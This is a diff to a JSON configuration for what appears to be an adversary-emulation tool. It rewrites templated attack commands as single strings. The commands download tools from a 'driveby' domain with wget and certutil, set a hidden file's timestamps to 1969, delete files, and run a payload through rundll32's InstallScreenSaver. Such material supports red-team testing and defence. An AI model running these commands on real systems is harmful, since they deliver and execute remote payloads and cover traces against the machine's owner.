@@ -248,17 +248,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{$fp = \"$($(Get-PSDrive | where{$_.DisplayRoot -match '\\\\'}).DisplayRoot)\\",
-                            "self.tool_name3",
-                            "\"; wget -O $fp http://",
-                            "self.driveby_domain3",
-                            "/",
-                            "self.tool_name3",
-                            "; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{$fp = \"$($(Get-PSDrive | where{$_.DisplayRoot -match '\\\\'}).DisplayRoot)\\${self.tool_name3}\"; wget -O $fp http://${self.driveby_domain3}/${self.tool_name3}; echo \" \"}"
                 }
             }
         },
@@ -286,15 +276,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{$NewDate = (Get-Date '01/01/1969 01:01am'); $TSFile = gci -hidden ",
-                            "self.temp_dir_name",
-                            "\\",
-                            "self.tool_name3",
-                            "; $TSFile.LastWriteTime = $NewDate; $TSFile.CreationTime = $NewDate; $TSFile.LastAccessTime = $NewDate; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{$NewDate = (Get-Date '01/01/1969 01:01am'); $TSFile = gci -hidden ${self.temp_dir_name}\\${self.tool_name3}; $TSFile.LastWriteTime = $NewDate; $TSFile.CreationTime = $NewDate; $TSFile.LastAccessTime = $NewDate; echo \" \"}"
                 }
             }
         },
@@ -328,15 +310,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "cmd /c del ",
-                            "self.temp_dir_name",
-                            "\\",
-                            "self.tool_name3",
-                            " && echo ' '"
-                        ]
-                    }
+                    "command": "cmd /c del ${self.temp_dir_name}\\${self.tool_name3} && echo ' '"
                 }
             }
         },
@@ -382,19 +356,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "cmd /c certutil.exe -urlcache -split -f http://",
-                            "self.driveby_domain5",
-                            "/",
-                            "self.tool_name5",
-                            " ",
-                            "self.temp_dir_name",
-                            "\\",
-                            "self.tool_name5",
-                            " && echo \" \""
-                        ]
-                    }
+                    "command": "cmd /c certutil.exe -urlcache -split -f http://${self.driveby_domain5}/${self.tool_name5} ${self.temp_dir_name}\\${self.tool_name5} && echo \" \""
                 }
             }
         },
@@ -407,15 +369,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "cmd /c rundll32 desk.cpl,InstallScreenSaver ",
-                            "self.temp_dir_name",
-                            "\\",
-                            "self.tool_name5",
-                            " && echo \" \""
-                        ]
-                    },
+                    "command": "cmd /c rundll32 desk.cpl,InstallScreenSaver ${self.temp_dir_name}\\${self.tool_name5} && echo \" \"",
                     "success_override": true,
                     "kill": false
                 }
